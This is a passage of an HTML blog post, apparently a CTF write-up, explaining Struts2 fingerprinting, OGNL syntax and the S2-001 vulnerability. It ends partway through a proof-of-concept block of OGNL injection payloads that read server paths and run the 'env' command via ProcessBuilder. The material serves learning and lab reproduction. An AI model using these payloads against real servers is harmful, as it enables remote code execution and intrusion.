@@ -1,0 +1,888 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    JAVA安全-Structs2漏洞及复现 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="Structs2框架简述 Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。其全新的Struts 2的体系结构与Struts 1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JAVA安全-Structs2漏洞及复现">
+<meta property="og:url" content="http://example.com/2025/08/13/JAVA-Struct2%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="Structs2框架简述 Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。其全新的Struts 2的体系结构与Struts 1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/08/13/images/image125410674.png">
+<meta property="og:image" content="http://example.com/2025/08/13/images/image131730143.png">
+<meta property="og:image" content="http://example.com/2025/08/13/images/image131846131.png">
+<meta property="og:image" content="http://example.com/2025/08/13/images/image145427131.png">
+<meta property="og:image" content="http://example.com/2025/08/13/images/image152202060.png">
+<meta property="og:image" content="http://example.com/2025/08/13/images/image153346663.png">
+<meta property="og:image" content="http://example.com/2025/08/13/images/image3154238874.png">
+<meta property="og:image" content="http://example.com/2025/08/13/images/image154837030.png">
+<meta property="og:image" content="http://example.com/2025/08/13/images/image160931828.png">
+<meta property="og:image" content="http://example.com/2025/08/13/images/image161804165.png">
+<meta property="og:image" content="http://example.com/2025/08/13/images/image162000069.png">
+<meta property="og:image" content="http://example.com/2025/08/13/images/image162516122.png">
+<meta property="article:published_time" content="2025-08-13T04:38:49.000Z">
+<meta property="article:modified_time" content="2026-01-24T08:15:49.281Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="JAVA安全">
+<meta property="article:tag" content="Struct2漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/08/13/images/image125410674.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="JAVA安全-Structs2漏洞及复现">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">JAVA安全-Structs2漏洞及复现</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#structs2%E6%A1%86%E6%9E%B6%E7%AE%80%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text"> Structs2框架简述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E7%BD%91%E7%AB%99%E6%98%AF%E5%90%A6%E5%9F%BA%E4%BA%8Estruts2"><span class="toc-number">2.</span> <span class="toc-text"> 判断网站是否基于Struts2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-ognl%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text"> 前置知识-OGNL表达式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%AE%BF%E9%97%AE%E5%B1%9E%E6%80%A7"><span class="toc-number">3.1.</span> <span class="toc-text"> (1) 访问属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%AE%BF%E9%97%AE-list-map"><span class="toc-number">3.2.</span> <span class="toc-text"> (2) 访问 List &#x2F; Map</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">3.3.</span> <span class="toc-text"> (3) 调用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95-%E9%9D%99%E6%80%81%E5%AD%97%E6%AE%B5"><span class="toc-number">3.4.</span> <span class="toc-text"> (4) 静态方法 &#x2F; 静态字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%BF%90%E7%AE%97%E4%B8%8E%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.5.</span> <span class="toc-text"> (5) 运算与条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1"><span class="toc-number">3.6.</span> <span class="toc-text"> (6) 创建对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%B5%8B%E5%80%BC"><span class="toc-number">3.7.</span> <span class="toc-text"> (7) 赋值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#struts2-%E4%B8%AD%E7%9A%84-ognl"><span class="toc-number">3.8.</span> <span class="toc-text"> Struts2 中的 OGNL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ognl%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%AD%E4%B8%89%E4%B8%AA%E7%AC%A6%E5%8F%B7-%E7%9A%84%E5%90%AB%E4%B9%89"><span class="toc-number">3.9.</span> <span class="toc-text"> OGNL表达式中三个符号 %，#，$ 的含义</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-001"><span class="toc-number">4.</span> <span class="toc-text"> S2-001</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">4.1.</span> <span class="toc-text"> 漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">4.2.</span> <span class="toc-text"> 影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.3.</span> <span class="toc-text"> 漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload%E8%A7%A3%E6%9E%90"><span class="toc-number">4.3.1.</span> <span class="toc-text"> payload解析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.3.2.</span> <span class="toc-text"> 工具复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-005"><span class="toc-number">5.</span> <span class="toc-text"> S2-005</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2"><span class="toc-number">5.1.</span> <span class="toc-text"> 漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-2"><span class="toc-number">5.2.</span> <span class="toc-text"> 影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="toc-number">5.3.</span> <span class="toc-text"> 漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-007"><span class="toc-number">6.</span> <span class="toc-text"> S2-007</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-3"><span class="toc-number">6.1.</span> <span class="toc-text"> 漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-3"><span class="toc-number">6.2.</span> <span class="toc-text"> 影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3"><span class="toc-number">6.3.</span> <span class="toc-text"> 漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">6.3.1.</span> <span class="toc-text"> 漏洞检测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">6.3.2.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-008"><span class="toc-number">7.</span> <span class="toc-text"> S2-008</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-4"><span class="toc-number">7.1.</span> <span class="toc-text"> 漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-4"><span class="toc-number">7.2.</span> <span class="toc-text"> 影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%80cookie"><span class="toc-number">7.3.</span> <span class="toc-text"> 漏洞利用一（Cookie）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%BA%8Cdebug"><span class="toc-number">7.4.</span> <span class="toc-text"> 漏洞利用二（debug）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#s2-009"><span class="toc-number">8.</span> <span class="toc-text"> S2-009</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-5"><span class="toc-number">8.1.</span> <span class="toc-text"> 漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-5"><span class="toc-number">8.2.</span> <span class="toc-text"> 影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-4"><span class="toc-number">8.3.</span> <span class="toc-text"> 漏洞复现</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-JAVA-Struct2漏洞及复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/08/13/JAVA-Struct2%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%A4%8D%E7%8E%B0/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-08-13T04:38:49.000Z" itemprop="datePublished">2025-08-13</time>
+    <time style="display: none;" id="post-update-time">2026-01-24</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98/" data-aos="zoom-in">刷题</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h2 id="structs2框架简述"><a class="markdownIt-Anchor" href="#structs2框架简述"></a> Structs2框架简述</h2>
+<p>Struts2是一个<strong>基于MVC设计模式的Web应用框架</strong>，它本质上相当于一个servlet，在MVC设计模式中，Struts2<strong>作为控制器(Controller)来建立模型与视图的数据交互</strong>。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。其全新的Struts 2的体系结构与Struts 1的体系结构差别巨大。Struts 2以WebWork为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与ServletAPI完全脱离开，所以Struts 2可以理解为WebWork的更新产品</p>
+<p>总结：</p>
+<p>Struct2是基于MVC MVC 设计模式的<strong>WEB层框架</strong>。<br />
+<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Struct&amp;spm=1001.2101.3001.7020">Struct</a> 2的内核相对于Struct1来讲已经发生了巨大的变化。</p>
+<p>常见WEB层框架有<strong>Struct2、Struct1、Webwork、SpringMVC</strong></p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/struts2">https://github.com/vulhub/vulhub/tree/master/struts2</a></p>
+<h2 id="判断网站是否基于struts2"><a class="markdownIt-Anchor" href="#判断网站是否基于struts2"></a> 判断网站是否基于Struts2</h2>
+<ol>
+<li>
+<p><strong>通过页面错误回显判断</strong></p>
+<ul>
+<li>访问不存在的 Action 或传入特殊参数，若返回 Struts2 相关错误信息（如 “No result defined for action” 或 OGNL 解析错误），基本可确认。</li>
+<li>如果网站关闭了错误显示，这个方法无效。</li>
+</ul>
+</li>
+<li>
+<p><strong>通过 URL 后缀判断</strong></p>
+<ul>
+<li>常见后缀：<code>.do</code>、<code>.action</code>。</li>
+<li>仅作参考，可能存在误判（其他框架也可能用这些后缀）。</li>
+</ul>
+</li>
+<li>
+<p><strong>无后缀 URI 判断</strong></p>
+<ul>
+<li>如果 <code>struts.xml</code> 中常量 <code>struts.action.extension</code> 以逗号结尾或有空值，说明允许 Action 无后缀访问，此时无后缀 URI 也可能是 Struts2。</li>
+</ul>
+</li>
+<li>
+<p><strong>REST 插件默认后缀判断</strong></p>
+<ul>
+<li>
+<p>若使用 Struts2 REST 插件，其默认在 <code>struts-plugin.xml</code> 中指定的后缀为：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.xhtml</span><br><span class="line">.xml</span><br><span class="line">.json</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>访问内置管理控制台判断</strong></p>
+<ul>
+<li>
+<p>尝试访问：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/struts/webconsole.html</span><br></pre></td></tr></table></figure>
+<p>若存在并显示 Web Console，且 <code>devMode=true</code>，则为 Struts2（仅在开发模式下可能暴露）。</p>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="前置知识-ognl表达式"><a class="markdownIt-Anchor" href="#前置知识-ognl表达式"></a> 前置知识-OGNL表达式</h2>
+<h3 id="1-访问属性"><a class="markdownIt-Anchor" href="#1-访问属性"></a> (1) <strong>访问属性</strong></h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name            // 等同于 obj.getName()</span><br><span class="line">user.address    // 等同于 obj.getUser().getAddress()</span><br></pre></td></tr></table></figure>
+<h3 id="2-访问-list-map"><a class="markdownIt-Anchor" href="#2-访问-list-map"></a> (2) <strong>访问 List / Map</strong></h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">users[0]        // 第一个用户</span><br><span class="line">map[&#x27;key&#x27;]      // 获取 map 中 key 对应的值</span><br></pre></td></tr></table></figure>
+<h3 id="3-调用方法"><a class="markdownIt-Anchor" href="#3-调用方法"></a> (3) <strong>调用方法</strong></h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user.getName()</span><br><span class="line">user.isActive()</span><br><span class="line">user.calcScore(10)</span><br></pre></td></tr></table></figure>
+<h3 id="4-静态方法-静态字段"><a class="markdownIt-Anchor" href="#4-静态方法-静态字段"></a> (4) <strong>静态方法 / 静态字段</strong></h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@类全名@方法(参数)</span><br><span class="line">@java.lang.Math@max(3,5)    // 调用静态方法</span><br><span class="line">@java.lang.Math@PI          // 访问静态常量</span><br></pre></td></tr></table></figure>
+<h3 id="5-运算与条件"><a class="markdownIt-Anchor" href="#5-运算与条件"></a> (5) <strong>运算与条件</strong></h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 + 2</span><br><span class="line">age &gt; 18 ? &quot;adult&quot; : &quot;minor&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="6-创建对象"><a class="markdownIt-Anchor" href="#6-创建对象"></a> (6) <strong>创建对象</strong></h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new java.util.Date()</span><br><span class="line">new java.lang.String(&quot;abc&quot;)</span><br></pre></td></tr></table></figure>
+<h3 id="7-赋值"><a class="markdownIt-Anchor" href="#7-赋值"></a> (7) <strong>赋值</strong></h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name = &quot;Alice&quot;</span><br><span class="line">user.age = 20</span><br></pre></td></tr></table></figure>
+<h3 id="struts2-中的-ognl"><a class="markdownIt-Anchor" href="#struts2-中的-ognl"></a> Struts2 中的 OGNL</h3>
+<p>在 Struts2：</p>
+<ul>
+<li>
+<p><strong>请求参数绑定</strong><br />
+HTTP 参数会被自动解析为 OGNL 表达式，用来设置 Action 对象的属性。<br />
+例如：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /user.action?name=Tom</span><br></pre></td></tr></table></figure>
+<p>会执行相当于：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name = &quot;Tom&quot;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="ognl表达式中三个符号-的含义"><a class="markdownIt-Anchor" href="#ognl表达式中三个符号-的含义"></a> OGNL表达式中三个符号 <code>%，#，$</code> 的含义</h3>
+<ul>
+<li><code>%</code>的用途是在标志的属性为字符串类型时，计算OGNL表达式**%{}**中的值</li>
+<li><code>#</code>的用途访主要是访问非根对象属性，因为Struts 2中值栈被视为根对象，所以<strong>访问其他非根对象（例如上下文变量、session、application）时，需要加#前缀才可以调用</strong></li>
+<li><code>$</code>主要是在Struts 2配置文件中，引用OGNL表达式</li>
+</ul>
+<h2 id="s2-001"><a class="markdownIt-Anchor" href="#s2-001"></a> S2-001</h2>
+<p>通过CTFSHOW来复现</p>
+<h3 id="漏洞原理"><a class="markdownIt-Anchor" href="#漏洞原理"></a> 漏洞原理</h3>
+<p>该漏洞因用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值<strong>使用OGNL表达式%{value}进行解析</strong>，然后重新填充到对应的表单数据中。如注册或登录页面，提交失败后一般会默认返回之前提交的数据，由于后端使用%{value}对提交的数据执行了一次OGNL 表达式解析，所以可以直接构造 Payload进行命令执行。</p>
+<h3 id="影响版本"><a class="markdownIt-Anchor" href="#影响版本"></a> 影响版本</h3>
+<p>Struts 2.0.0 - 2.0.8</p>
+<h3 id="漏洞复现"><a class="markdownIt-Anchor" href="#漏洞复现"></a> 漏洞复现</h3>
+<p><img src="../images/image125410674.png" alt="imag125410674" /></p>
+<p>输入OGNL表达式**%{1+1}**来验证漏洞</p>
+<p><img src="../images/image131730143.png" alt="image131730143" /></p>
+<p><img src="../images/image131846131.png" alt="image131846131" /></p>
+<p>成功返回2</p>
+<p>POC:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取tomcat路径</span></span><br><span class="line">%&#123;<span class="string">&quot;tomcatBinDir&#123;&quot;</span>+<span class="meta">@java</span>.lang.System<span class="meta">@getProperty(&quot;user.dir&quot;)</span>+<span class="string">&quot;&#125;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取web路径</span></span><br><span class="line">%&#123;#req=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getRequest()</span>,#response=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>).getWriter(),#response.println(#req.getRealPath(<span class="string">&#x27;/&#x27;</span>)),#response.flush(),#response.close()&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 命令执行 env，flag就在其中</span></span><br><span class="line">%&#123;#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;env&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start(),</span><br><span class="line">#b=#a.getInputStream(),</span><br><span class="line">#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),</span><br><span class="line">#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),</span><br><span class="line">#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],</span><br><span class="line">#d.read(#e),</span><br><span class="line">#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),</span><br><span class="line">#f.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),</span><br><span 